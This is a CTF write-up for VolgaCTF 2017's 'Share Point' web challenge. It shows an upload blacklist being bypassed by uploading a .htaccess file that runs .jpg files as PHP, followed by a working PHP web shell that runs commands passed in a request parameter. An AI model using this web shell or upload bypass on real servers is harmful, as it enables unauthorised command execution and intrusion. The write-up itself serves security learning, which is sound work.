# Volga CTF Quals 2017 Share Point
### Category: Web, 200 points

> Look! I wrote a good service for sharing your files with your friends, enjoy)
> share-point.quals.2017.volgactf.ru

### Write-up
The share point web application is written in php and enables users to upload and share files. To solve this challenge 
we need to upload a php shell to the server. The upload form is blacklisting some extensions, such as .php and .html. Chaning the
Content-Type in the HTTP POST request doesn't work. We also tried null terminating the filename by adding characters such as 
\0, %00, " to the end of the file. 

The web server is however running apache and allows us to upload a .htaccess file, we can use htaccess to execute other
file extensions as php. If we want to treat .jpg files as PHP we can upload the .htaccess file below:
```
AddType application/x-httpd-php .jpg
```

After this we uploaded shell.jpg contaning:
```php
<?php
if(isset($_REQUEST['cmd'])){
echo "<pre>";
$cmd = ($_REQUEST['cmd']);
system($cmd);
echo "</pre>";
die;
}
?>
```
We can now execute shell commands with:
http://share-point.quals.2017.volgactf.ru/files/$USERNAME/shell.jpg?cmd=ls

After running "find / -iname \*flag\*" the file /opt/flag.txt was found
> VolgaCTF{AnoTHer_apPro0Ach_to_file_Upl0Ad_with_PhP}

